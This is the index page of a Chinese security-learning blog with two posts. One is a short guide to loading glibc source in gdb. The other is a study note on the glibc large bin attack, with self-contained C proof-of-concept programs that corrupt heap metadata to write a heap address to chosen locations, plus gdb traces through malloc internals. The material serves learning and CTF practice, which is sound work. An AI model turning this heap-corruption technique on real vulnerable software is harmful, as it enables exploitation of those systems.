<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CharonPt的Blog">
<meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/index.html">
<meta property="og:site_name" content="CharonPt的Blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://github.com/CharonPt/CharonPt.github.io.git/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>CharonPt的Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CharonPt的Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/12/gdb%E5%8A%A0%E8%BD%BDlibc%E6%BA%90%E7%A0%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/12/gdb%E5%8A%A0%E8%BD%BDlibc%E6%BA%90%E7%A0%81/" class="post-title-link" itemprop="url">gdb加载libc源码</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-05-12 21:52:28 / 修改时间：22:01:10" itemprop="dateCreated datePublished" datetime="2022-05-12T21:52:28+08:00">2022-05-12</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="搭建Glibc源码调试环境"><a href="#搭建Glibc源码调试环境" class="headerlink" title="搭建Glibc源码调试环境"></a>搭建Glibc源码调试环境</h3><p>方法也是从别人的博客嫖的，为了防止搞丢所以这里简单记一下</p>
<p>能跟源码是真的舒服，堆利用在讲原理时往往甩一堆源码过来，然后里面一些变量指的是什么也不说清楚，导致稍微复杂点的源码就很难审懂（也许是我的问题）</p>
<p>在gdb里能加载源码之后直接跟到想看的位置再稍微跟一下就能比较简单地搞懂一些代码实现了什么功能，以及怎样实现的……</p>
<h4 id="1-下载并解压glibc源码"><a href="#1-下载并解压glibc源码" class="headerlink" title="1.下载并解压glibc源码"></a>1.下载并解压glibc源码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install glibc-source</span><br><span class="line">cd /usr/src/glibc</span><br><span class="line">sudo tar xvf glibc-2.23.tar.xz </span><br></pre></td></tr></table></figure>

<h4 id="2-配置GDB"><a href="#2-配置GDB" class="headerlink" title="2.配置GDB"></a>2.配置GDB</h4><p>打开gdb配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim ~/.gdbinit</span><br></pre></td></tr></table></figure>

<p>在首行加入以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directory /usr/src/glibc/glibc-2.23/malloc:/usr/src/glibc/glibc-2.23/elf</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/12/large-bin/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/12/large-bin/" class="post-title-link" itemprop="url">large-bin</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-05-12 14:41:30" itemprop="dateCreated datePublished" datetime="2022-05-12T14:41:30+08:00">2022-05-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-15 20:37:21" itemprop="dateModified" datetime="2022-05-15T20:37:21+08:00">2022-05-15</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="large-bin的结构"><a href="#large-bin的结构" class="headerlink" title="large bin的结构"></a>large bin的结构</h3><p>因为每个large bin中保存的都是一个范围内的chunk，而且其使用了<code>fd_nextsize</code>和<code>bk_nextsize</code>，所以使得large bin的结构相对复杂。想搞明白这个还是自己写个demo去gdb里看看会比较清楚。</p>
<p>其实际上是这样的：</p>
<ol>
<li>一个large bin中不同大小的chunk按大小顺序排列</li>
<li>一个large bin中相同大小的chunk按free掉的时间先后排列，后free掉的插入到节头（这个名词可能不太准确，结合下面的图片意会一下即可）</li>
<li>large bin中所有chunk的fd/bk指针都会被使用，fd/bk指针将所有chunk（跟large bin）连接成一个双向链表</li>
<li><code>fd_nextsize</code>跟<code>bk_nextsize</code>只会在large bin中每一个特定大小的第一个chunk中使用，这两个指针将同一个large bin中每一个特定大小的第一个chunk连接成一个双向链表</li>
<li>如果一个large bin中只有一个特定大小的chunk，那么第一个chunk的<code>fd_nextsize</code>跟<code>bk_nextsize</code>都指向自己</li>
</ol>
<p>接下来结合图片来看就很简单了</p>
<p>我们将一个0x460、两个0x450，一个0x440的chunk放到large bin中，因为[0x440-0x480)大小属于同一个large bin，所以这四个chunk会被放到同一个large bin中。这四个chunk在large bin中形成的完整结构如下：</p>
<img src="/2022/05/12/large-bin/large-bin-1.jpg" class>

<p>看着确实很乱，但是我们把fd/bk跟fd_nextsize/bk_nextsize分开看就会好很多</p>
<p>把fd_nextsize/bk_nextsize去掉：</p>
<img src="/2022/05/12/large-bin/large-bin-2.png" class>

<p>现在就很明了了，也就是第三点<code>large bin中所有chunk的fd/bk指针都会被使用，fd/bk指针将所有chunk（跟large bin）连接成一个双向链表</code></p>
<p>现在把fd/bk去掉：</p>
<img src="/2022/05/12/large-bin/large-bin-3.jpg" class>

<p>这就是第四点的意思，可以看到第二个0x450的chunk并没有使用<code>fd_nextsize/bk_nextsize</code></p>
<h3 id="large-bin拆链"><a href="#large-bin拆链" class="headerlink" title="large bin拆链"></a>large bin拆链</h3><p>理解了上面large bin的结构之后，再来学习large bin的拆链过程，也就是从一个large bin中取出chunk的这个过程。</p>
<p>总的来说其实很简单，我们可以分成两个链表来看：① 由<code>fd_nextsize/bk_nextsize</code>组成的双向链表。② 由<code>fd/bk</code>组成的双向链表。（为了方便叙述，我们将这两种链表称为链表①跟链表②）</p>
<p>任意一个chunk从bin中被取出后都要保持bin链表的完整性，所以会对这个chunk所属的链表进行维护，具体来说就是修改这个chunk在所属链表中其前后chunk的对应指针。如果这个chunk仅属于链表②，那么做如下修改（P就是当前chunk）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk = P-&gt;bk;</span><br><span class="line">P-&gt;bk-&gt;fd = P-&gt;fd;</span><br></pre></td></tr></table></figure>

<p>如果这个chunk同时属于链表①，那么还需要如下修改：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd_nextsize-&gt;bk_next_size = P-&gt;bk_nextsize;</span><br><span class="line">p-&gt;bk_nextsize-&gt;fd_next_size = P-&gt;fd_nextsize;</span><br></pre></td></tr></table></figure>

<p>以上这部分稍微画画图就懂了，所以不贴图了</p>
<h3 id="large-bin-attack总结"><a href="#large-bin-attack总结" class="headerlink" title="large bin attack总结"></a>large bin attack总结</h3><p>原理我觉得我搞得比较懂了，但是在实例中也仅在自己写的一些demo中利用过，到时在题目中遇到了再回来补例题。</p>
<p>该攻击方法实现的是将一个堆地址写入到任意一/两个地址当中</p>
<p>条件：</p>
<ol>
<li>能控制某一个large bin的bk或者bk_nextsize字段</li>
<li>即将入bin的chunk必须紧贴被修改的large bin chunk，意思就是正常情况下这个即将入bin的chunk必须插入到被修改的chunk的左侧或右侧（结合结构图意会一下）</li>
</ol>
<p>利用方式：</p>
<ol>
<li>将一个large bin chunk的bk/bk_nextsize字段分别修改为(add - 2)、(addr - 4)</li>
<li>让程序从unsorted bin中将一个chunk插入到这个被修改的large bin chunk的左侧/右侧</li>
</ol>
<p>根据要插入large bin的chunk（称这个chunk为victim）跟被修改的large bin chunk（称这个chunk为P）的相对大小，细分来说有两种情况：</p>
<ol>
<li><p>victim<strong>大于</strong>P，在这种情况下会完成两处写入：</p>
<p>① 将victim的地址写入到<code>P-&gt;bk-&gt;fd</code>处。② 将victim的地址写入到<code>P-&gt;bk_nextsize-&gt;fd_nextsize</code>处</p>
</li>
<li><p>victim<strong>小于</strong>P，在这种情况下只会完成一处写入：</p>
<p>将victim的地址写入<code>P-&gt;bk_nextsize-&gt;fd_nextsize</code>处</p>
</li>
</ol>
<p>（注意大小相等时无法利用）</p>
<p>libc版本问题：</p>
<p>从libc-2.30开始加入了对large bin跳表的完整性检查（具体是啥我也没看），总之这个检查使得unsorted bin chunk大于链表中的最小的chunk时的利用失效（也就对应了<code>victim大于P</code>的这种情况），这时只能让victim小于P来完成利用。</p>
<p>我稍微改了下用来演示large bin attack的demo，主要是避免了tache的影响，将该源码生成的程序在libc-2.30以上运行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x510</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x610</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x610</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x631</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意到第18行改p2的size那一步，将其改成0x631就对应了<code>victim小于P</code>的这种情况，因为这种情况还是能够利用的，所以最后程序运行结果为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./a.out</span><br><span class="line">stack_var1 (0x7ffc890c2258): (nil)</span><br><span class="line">stack_var2 (0x7ffc890c2260): 0xc63e30</span><br></pre></td></tr></table></figure>

<p>可以看到只完成了一处写入</p>
<p>但是如果将P的大小改成如0x611，也就是对应<code>victim大于P</code>的这种情况，由于新加入的检查导致程序会崩溃</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./a.out</span><br><span class="line">malloc(): largebin double linked list corrupted (nextsize)</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>

<h3 id="结合源码分析large-bin-attack"><a href="#结合源码分析large-bin-attack" class="headerlink" title="结合源码分析large-bin-attack"></a>结合源码分析large-bin-attack</h3><p>在how2heap中演示large bin attack的源码的基础上只保留了重要的操作部分，把说明的部分去掉了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到第14行为止把chunk1跟chunk2放到了unsorted bin中，在第15行<code>malloc(0x90);</code>的这一步中，按照glibc的逻辑，程序会执行以下几步：</p>
<ol>
<li>取出unsorted bin中的最后一个chunk（p1）</li>
<li>因为p1的大小属于small bin，所以将其放到small bin，然后标记这个small bin中有free chunk</li>
<li>取出unsorted bin中的最后一个chunk（p2）</li>
<li>因为p2的大小属于large bin，所以将其放到large bin，并且标记这个large bin中有free chunk</li>
<li>最后从small bin中找到了满足申请需求的chunk（p1），从p1中割下需求的大小（0xa0），并且把剩余部分（0x330-0xa0）放到unsorted bin中</li>
</ol>
<h4 id="从unsorted-bin中取出chunk"><a href="#从unsorted-bin中取出chunk" class="headerlink" title="从unsorted bin中取出chunk"></a>从unsorted bin中取出chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">3521</span>           <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">► <span class="number">3522</span>           unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">  <span class="number">3523</span>           bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>

<p>其中<code>av</code>是<code>main_arena</code>的起始地址，<code>unsorted_chunks(av)</code>表示找到unsorted bin链表，<code>unsorted_chunks (av)-&gt;bk</code>就表示取unsorted bin链表的bk指针（也就是unsorted bin链表的最后一个chunk）</p>
<p>同时<code>victim</code>是当前要取出的chunk，<code>bck == victim-&gt;bk</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p bck</span><br><span class="line">$10 = (mchunkptr) 0x6037a0</span><br><span class="line">gdb-peda$ p victim</span><br><span class="line">$11 = (mchunkptr) 0x6030a0</span><br><span class="line">gdb-peda$ p victim-&gt;bk</span><br><span class="line">$12 = (struct malloc_chunk *) 0x6037a0</span><br></pre></td></tr></table></figure>

<p>此时unsorted bin链表中共有两个chunk</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: 0x6037a0 —▸ 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6037a0</span><br></pre></td></tr></table></figure>

<p>那么就很容易理解源码中的两行代码，其实就是进行了一个链表的更改，将victim从链表中取了出来</p>
<p>执行完3522</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">3521</span>           <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">   <span class="number">3522</span>           unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line"> ► <span class="number">3523</span>           bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: <span class="number">0x6037a0</span> —▸ <span class="number">0x6030a0</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x6037a0</span></span><br><span class="line">BK: <span class="number">0x6037a0</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x6037a0</span></span><br></pre></td></tr></table></figure>

<p>执行完3523</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: 0x6037a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6037a0</span><br></pre></td></tr></table></figure>

<h4 id="取出之后"><a href="#取出之后" class="headerlink" title="取出之后"></a>取出之后</h4><p>从unsorted bin中取出chunk之后，就开始根据这个chunk的大小来判断要将它放到哪个bin中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br></pre></td></tr></table></figure>

<p>此时我们取出的这个chunk(p1)的大小是0x330，属于small bin范围，所以进入if分支，将p1放到small bin中。</p>
<p>接下来程序重复以上步骤：<strong>取出unsorted bin中的最后一个chunk，并将它放到对应的bin中</strong></p>
<p>那么下一个要取出的chunk就是p2，因为这个chunk属于large bin，所以进入else分支</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">3546</span>           <span class="keyword">else</span></span><br><span class="line">  <span class="number">3547</span>             &#123;</span><br><span class="line">► <span class="number">3548</span>               victim_index = largebin_index (size);</span><br><span class="line">  <span class="number">3549</span>               bck = bin_at (av, victim_index);</span><br><span class="line">  <span class="number">3550</span>               fwd = bck-&gt;fd;</span><br><span class="line">  <span class="number">3551</span> </span><br><span class="line">  <span class="number">3552</span>               <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">  <span class="number">3553</span>               <span class="keyword">if</span> (fwd != bck)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意此时<code>victim == 0x6037a0</code>，<code>victim-&gt;bk == 0x7ffff7dd1f68 &lt;main_arena+88&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x6037a0</span><br><span class="line">0x6037a0:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x6037b0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</span><br></pre></td></tr></table></figure>

<p>但是执行完3549之后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p bck</span><br><span class="line">$8 = (mchunkptr) 0x7ffff7dd1f68 &lt;main_arena+1096&gt;</span><br></pre></td></tr></table></figure>

<p>发现<code>bck</code>不再等于<code>victim-&gt;bk</code>了，而是等于存储大小为0x400范围的large bin的表头所在位置，所以</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">3548</span>               victim_index = largebin_index (size);</span><br><span class="line">  <span class="number">3549</span>               bck = bin_at (av, victim_index);</span><br></pre></td></tr></table></figure>

<p>这两行代码的意思其实就是用victim的size去找到其属于哪个large bin的下标，用下标去找到对应的large bin的地址，然后返回给bck</p>
<p>所以<code>bck-&gt;fd</code>实际上是那个大小的<strong>large bin中的第一个chunk</strong>（也就是那个large bin链表中最大的chunk）</p>
<p>（因为此时large bin中还没有chunk，所以<code>bck-&gt;fd</code>中保存的是large bin自身的地址）</p>
